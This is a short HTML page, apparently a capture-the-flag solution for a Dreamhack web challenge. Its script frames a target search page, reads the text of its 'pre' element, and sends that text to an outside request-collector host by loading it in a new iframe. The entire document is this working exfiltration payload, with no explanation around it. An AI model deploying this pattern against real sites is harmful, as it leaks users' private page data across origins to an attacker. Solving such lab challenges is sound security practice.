
<html>
    <script>
    const afterLoad = function(el) {
          const iframe = document.createElement("iframe")
          let text = "";
          try {
              text = document.getElementById("query").contentWindow.document.getElementsByTagName("pre")[0].textContent 
          } catch (error) {
              text = "NoNo"
          }
          iframe.src = `https://mbfjcpx.request.dreamhack.games/` + text
          document.body.append(iframe)
      }
  </script>
  <body>

      <iframe src="http://host8.dreamhack.games:9098/search?query=D" id="query" onerror="afterLoad(this)" onload="afterLoad(this)"></iframe>
  </body>

</html>
